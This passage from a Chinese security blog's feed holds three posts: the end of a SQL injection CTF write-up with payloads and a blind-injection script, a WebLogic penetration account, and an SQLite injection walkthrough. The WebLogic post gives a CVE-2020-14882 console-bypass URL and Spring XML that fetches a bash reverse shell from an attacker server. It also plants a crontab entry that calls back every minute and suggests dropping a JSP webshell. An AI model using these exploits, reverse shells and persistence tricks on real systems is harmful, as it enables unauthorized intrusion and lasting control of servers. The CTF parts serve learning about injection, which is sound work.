class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>; </span><br><span class="line">  login_chk();</span><br><span class="line">  $db = dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, $_GET[id])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\&#x27;/&#x27;</span>,$_GET[id])) <span class="keyword">exit</span>(<span class="string">&quot;HeHe&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\&#x27;/&#x27;</span>,$_GET[pw])) <span class="keyword">exit</span>(<span class="string">&quot;HeHe&quot;</span>);</span><br><span class="line">  $query = <span class="string">&quot;select id from prob_succubus where id=&#x27;<span class="subst">&#123;$_GET[id]&#125;</span>&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">&#x27;id&#x27;</span>]) solve(<span class="string">&quot;succubus&quot;</span>); </span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>过滤了单引号，但sql语句中存在两个可控点，可以在id参数输入<code>\</code>将第一个单引号进行转义，后续pw即可输入注入语句进行SQL注入</p><p>payload：<code>1\&amp;pw=or+1=1--+</code></p><p>闭合后的SQL语句为：<code>**select id from prob_succubus where id=&#39;1\&#39; and pw=&#39;or 1=1-- &#39;**</code></p><h1 id="17-zombie-assassin"><a href="#17-zombie-assassin" class="headerlink" title="17. zombie_assassin"></a>17. zombie_assassin</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>; </span><br><span class="line">  login_chk(); </span><br><span class="line">  $db = dbconnect();</span><br><span class="line">  $_GET[<span class="string">&#x27;id&#x27;</span>] = strrev(addslashes($_GET[<span class="string">&#x27;id&#x27;</span>]));</span><br><span class="line">  $_GET[<span class="string">&#x27;pw&#x27;</span>] = strrev(addslashes($_GET[<span class="string">&#x27;pw&#x27;</span>]));</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, $_GET[id])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line">  $query = <span class="string">&quot;select id from prob_zombie_assassin where id=&#x27;<span class="subst">&#123;$_GET[id]&#125;</span>&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">&#x27;id&#x27;</span>]) solve(<span class="string">&quot;zombie_assassin&quot;</span>); </span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>思路跟16题基本差不多，只是多了个字符翻转</p><p>Paylaod: <code>?id=%00&amp;pw=%231%20ro</code></p><h1 id="18-NIGHTMARE"><a href="#18-NIGHTMARE" class="headerlink" title="18. NIGHTMARE"></a>18. NIGHTMARE</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>; </span><br><span class="line">  login_chk(); </span><br><span class="line">  $db = dbconnect(); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)|#|-/i&#x27;</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line">  <span class="keyword">if</span>(strlen($_GET[pw])&gt;<span class="number">6</span>) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line">  $query = <span class="string">&quot;select id from prob_nightmare where pw=(&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;) and id!=&#x27;admin&#x27;&quot;</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">&#x27;id&#x27;</span>]) solve(<span class="string">&quot;nightmare&quot;</span>); </span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>Payload:<code>?pw=%27)=0;%00</code></p><p>mysql连等，从左到右依次计算，<code>select id from prob_nightmare where pw=(&#39;&#39;)=0;</code>，pwd=’‘为false，然后0为false，false==false，所以最后语句为<code>select id from prob_nightmare where pw=true</code>，即可绕过</p><h1 id="19-xavis"><a href="#19-xavis" class="headerlink" title="19. xavis"></a>19. xavis</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>; </span><br><span class="line">  login_chk(); </span><br><span class="line">  $db = dbconnect(); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/regex|like/i&#x27;</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">&quot;HeHe&quot;</span>); </span><br><span class="line">  $query = <span class="string">&quot;select id from prob_xavis where id=&#x27;admin&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">&#x27;id&#x27;</span>]) <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;Hello <span class="subst">&#123;$result[id]&#125;</span>&lt;/h2&gt;&quot;</span>; </span><br><span class="line">   </span><br><span class="line">  $_GET[pw] = addslashes($_GET[pw]); </span><br><span class="line">  $query = <span class="string">&quot;select pw from prob_xavis where id=&#x27;admin&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class="line">  <span class="keyword">if</span>(($result[<span class="string">&#x27;pw&#x27;</span>]) &amp;&amp; ($result[<span class="string">&#x27;pw&#x27;</span>] == $_GET[<span class="string">&#x27;pw&#x27;</span>])) solve(<span class="string">&quot;xavis&quot;</span>); </span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>由于结果是韩文，所以要用二分查找加快速度，查出来结果输入进去还是不太对</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cookie = &#123;<span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;pq2v3qor5eic81d2jsjc3jl41d&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;1%27+or+id=&#x27;admin&#x27;+and+ord(mid(pw,&#123;&#125;,1))&gt;&#123;&#125;--+&quot;</span></span><br><span class="line"></span><br><span class="line">temp = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">    min_num = <span class="number">44032</span></span><br><span class="line">    max_num = <span class="number">55295</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">abs</span>(max_num-min_num)&gt;<span class="number">1</span>:</span><br><span class="line">        mid = (max_num+min_num)//<span class="number">2</span></span><br><span class="line">        r = requests.get(<span class="string">&quot;https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php?pw=&quot;</span>+payload.<span class="built_in">format</span>(i+<span class="number">1</span>, mid), </span><br><span class="line">            cookies=cookie, proxies=&#123;<span class="string">&#x27;https&#x27;</span>: <span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>, <span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>&#125;,</span><br><span class="line">            verify=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Hello admin&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            min_num = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            max_num = mid</span><br><span class="line"></span><br><span class="line">    temp = temp+<span class="built_in">chr</span>(max_num)</span><br><span class="line">    print(temp)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>跑出来的结果<code>우왕굳각각각각각각각각각</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;最近复习注入，便找了许多ctf题目来做，这个题目一共48道注入题，记录一下解题过程。&lt;/p&gt;
&lt;p&gt;平台地址为：&lt;a href=&quot;https://los.rubiya.kr/&quot;&gt;https://los.rubiya.kr/&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;1-gremlin</summary>
      
    
    
    
    <category term="CTF" scheme="http://blog.le31ei.top/categories/CTF/"/>
    
    
    <category term="SQL注入" scheme="http://blog.le31ei.top/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>记一次实战weblogic渗透</title>
    <link href="http://blog.le31ei.top/2020/11/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98weblogic%E6%B8%97%E9%80%8F/"/>
    <id>http://blog.le31ei.top/2020/11/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98weblogic%E6%B8%97%E9%80%8F/</id>
    <published>2020-11-16T04:00:32.000Z</published>
    <updated>2020-11-16T04:00:33.007Z</updated>
    
    <content type="html"><![CDATA[<p>某次测试中发现一个开放在外网的weblogic，版本为10.3.6，直接输入<code>/console</code>，就能打开管理页面</p><p><img src="/2020/11/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98weblogic%E6%B8%97%E9%80%8F/image-20201116112750237.png" alt="image-20201116112750237"></p><p><img src="/2020/11/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98weblogic%E6%B8%97%E9%80%8F/image-20201116112728397.png" alt="image-20201116112728397"></p><p>直接测试<code>http://ip:port/console/css/%252e%252e%252fconsole.portal</code>能绕过console登录，直接进入后台，但后台权限较低，无法直接部署war包，于是根据vulhub，采用<code>FileSystemXmlApplicationContext</code>加载远程的xml进行攻击</p><p><img src="/2020/11/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98weblogic%E6%B8%97%E9%80%8F/image-20201116114020053.png" alt="image-20201116114020053"></p><p>在远程服务器写入xml文件，并使用python搭建http server，<code>python -m SimpleHTTPServer 5555</code></p><p>xml文件内容写上反弹shell的命令，并在weblogic中访问以下命令：<br><code>http://ip:port/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(&quot;http://vps:5555/rce.xml&quot;)</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;pb&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="attr">init-method</span>=<span class="string">&quot;start&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>bash<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>&lt;![CDATA[bash -i &gt;&amp; /dev/tcp/ip/8888 0&gt;&amp;1]]&gt;<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>但是结果发现虽然有连接回来，但是生成不了shell</p><p><img src="/2020/11/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98weblogic%E6%B8%97%E9%80%8F/image-20201116115656814.png" alt="image-20201116115656814"></p><p><img src="/2020/11/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98weblogic%E6%B8%97%E9%80%8F/image-20201116114531532.png" alt="image-20201116114531532"></p><p>修改xml脚本，联想到平时在红蓝项目中，采用定时反弹shell的方式，直接写入crontab进行定时反弹，而不是在当前session进行反弹，修改后xml如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;pb&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="attr">init-method</span>=<span class="string">&quot;start&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>bash<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>&lt;![CDATA[echo -e &quot;*/1 * * * * exec 9&lt;&gt; /dev/tcp/ip/9998;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i&quot;|crontab -]]&gt;<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这样每隔一分钟，服务器会定时反弹shell回来，这种方式避免了weblogic在加载xml时就回弹shell，导致可能不成功的情况。</p><p>收到了反弹的shell</p><p><img src="/2020/11/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98weblogic%E6%B8%97%E9%80%8F/image-20201116114812911.png" alt="image-20201116114812911"></p><p>反弹的bash shell不太好找web相关的配置参数，比如web.xml文件等，于是采用find命令全局查找，找到相关的web目录如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/app/weblogic/Oracle/Middleware/user_projects/domains/mweb_domain/servers/mwebServer/tmp/_WL_user/mweb/&#123;username&#125;/war/</span><br></pre></td></tr></table></figure><p>可使用<code>wget</code>在该目录下写入jsp或者jspx的webshell</p><p>以上便是本次实际应用中碰到的weblogic渗透，做此记录。</p><p><strong>参考文档</strong></p><ol><li><a href="https://github.com/vulhub/vulhub/blob/master/weblogic/CVE-2020-14882/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/weblogic/CVE-2020-14882/README.zh-cn.md</a></li><li><a href="https://github.com/jas502n/CVE-2020-14882">https://github.com/jas502n/CVE-2020-14882</a></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;某次测试中发现一个开放在外网的weblogic，版本为10.3.6，直接输入&lt;code&gt;/console&lt;/code&gt;，就能打开管理页面&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2020/11/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6</summary>
      
    
    
    
    <category term="Pentest" scheme="http://blog.le31ei.top/categories/Pentest/"/>
    
    
    <category term="weblogic" scheme="http://blog.le31ei.top/tags/weblogic/"/>
    
  </entry>
  
  <entry>
    <title>sqlite注入</title>
    <link href="http://blog.le31ei.top/2020/11/10/sqlite%E6%B3%A8%E5%85%A5/"/>
    <id>http://blog.le31ei.top/2020/11/10/sqlite%E6%B3%A8%E5%85%A5/</id>
    <published>2020-11-10T07:14:57.000Z</published>
    <updated>2020-11-10T07:15:08.473Z</updated>
    
    <content type="html"><![CDATA[<p>sqlite手工注入基本跟mysql一致，只是函数没法通用，查库名和列名不一致</p><p>sqlite数据库中只存在<code>sqlite_master</code>和当前数据库。</p><p><strong>查询当前表名</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?id=1 union select 1,name,3,4 from sqlite_master where type=&#x27;table&#x27; limit 0,1</span><br></pre></td></tr></table></figure><p><strong>查询列名</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?id=1 union select 1,sql,3,4 from sqlite_master where type=&#x27;table&#x27; and name=&#x27;flag&#x27;</span><br></pre></td></tr></table></figure><p><strong>题目解析</strong></p><p><code>https://ringzer0ctf.com/challenges/40/?id=MQ==</code></p><p>该题目对id做了base64编码，存在sqlite注入，题目提示，id可以用<code>)</code>进行闭合。</p><p><img src="/2020/11/10/sqlite%E6%B3%A8%E5%85%A5/image-20201110151126659.png" alt="image-20201110151126659"></p><p><strong>查询表名</strong></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/challenges/40/?id=2)</span> union <span class="string">select</span> name,2,3 <span class="string">from</span> sqlite_master <span class="string">where</span> type=&#x27;table&#x27; <span class="string">limit</span> 0,1-- <span class="string">HTTP/1.1</span></span><br><span class="line"><span class="string">Host:</span> ringzer0ctf.com</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Pragma</span>: no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span>: no-cache</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span>: none</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span>: navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span>: ?1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span>: document</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br></pre></td></tr></table></figure><p><img src="/2020/11/10/sqlite%E6%B3%A8%E5%85%A5/image-20201110151309780.png" alt="image-20201110151309780"></p><p><strong>查询列名</strong></p><p>查询结果是创建表的语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;challenges&#x2F;40&#x2F;?id&#x3D;2) union select sql,2,3 from sqlite_master where type&#x3D;&#39;table&#39; and name&#x3D;&#39;flag&#39;-- HTTP&#x2F;1.1</span><br><span class="line">Host: ringzer0ctf.com</span><br><span class="line">Connection: close</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;86.0.4240.111 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br></pre></td></tr></table></figure><p><img src="/2020/11/10/sqlite%E6%B3%A8%E5%85%A5/image-20201110151358910.png" alt="image-20201110151358910"></p><p>最后即可查询出来flag</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/challenges/40/?id=2)</span> union <span class="string">select</span> content,2,3 <span class="string">from</span> flag <span class="string">limit</span> 0,1-- <span class="string">HTTP/1.1</span></span><br><span class="line"><span class="string">Host:</span> ringzer0ctf.com</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Pragma</span>: no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span>: no-cache</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span>: none</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span>: navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span>: ?1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span>: document</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br></pre></td></tr></table></figure><p><img src="/2020/11/10/sqlite%E6%B3%A8%E5%85%A5/image-20201110151430788.png" alt="image-20201110151430788"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;sqlite手工注入基本跟mysql一致，只是函数没法通用，查库名和列名不一致&lt;/p&gt;
&lt;p&gt;sqlite数据库中只存在&lt;code&gt;sqlite_master&lt;/code&gt;和当前数据库。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查询当前表名&lt;/strong&gt;&lt;/p&gt;
&lt;figure </summary>
      
    
    
    
    <category term="Pentest" scheme="http://blog.le31ei.top/categories/Pentest/"/>
